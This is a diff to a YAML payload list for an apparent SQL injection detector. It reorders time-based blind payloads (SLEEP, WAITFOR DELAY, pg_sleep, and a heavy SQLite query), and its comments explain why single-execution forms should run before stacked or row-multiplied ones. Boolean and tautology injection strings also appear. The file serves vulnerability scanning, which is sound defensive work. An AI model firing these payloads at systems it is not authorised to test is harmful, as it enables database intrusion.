@@ -20,19 +20,32 @@ payloads:
     - "') OR ('1'='1"
 
   time_based:
-    # MySQL
-    - "'; SELECT SLEEP(5)-- -"
-    - "' OR SLEEP(5)-- -"
+    # Order matters: the detector tries these in sequence under a per-endpoint
+    # time budget, and each SLEEP probe costs a full ~5s. Put the RELIABLE
+    # single-execution forms first.
+    #   - `AND SLEEP(n)` runs the sleep ONCE (only for the matched row), giving a
+    #     clean ~5s delay.
+    #   - `OR SLEEP(n)` is evaluated for EVERY row the query scans, so on a table
+    #     with several rows it multiplies to 5s*N and blows past the client read
+    #     timeout — the probe is discarded and the budget wasted before the
+    #     reliable payloads run. Keep it, but LAST.
+    #   - Stacked `'; SELECT SLEEP(5)` does not execute on drivers that reject
+    #     multi-statement queries (e.g. mysqli), so it is not a reliable primary.
+    # MySQL — single-execution first
     - "1' AND SLEEP(5)-- -"
     - "1 AND SLEEP(5)-- -"
+    - "' AND SLEEP(5)-- -"
     # MSSQL
-    - "'; WAITFOR DELAY '0:0:5'-- -"
     - "1; WAITFOR DELAY '0:0:5'-- -"
+    - "'; WAITFOR DELAY '0:0:5'-- -"
     # PostgreSQL
-    - "'; SELECT pg_sleep(5)-- -"
     - "1'; SELECT pg_sleep(5)-- -"
+    - "'; SELECT pg_sleep(5)-- -"
     # SQLite (no native sleep — uses heavy query as approximation)
     - "' AND (SELECT COUNT(*) FROM sqlite_master, sqlite_master m2, sqlite_master m3)>0 AND '1'='1"
+    # Stacked / row-multiplied forms LAST (see note above)
+    - "'; SELECT SLEEP(5)-- -"
+    - "' OR SLEEP(5)-- -"
 
   boolean_based:
     - "' AND 1=1-- -"
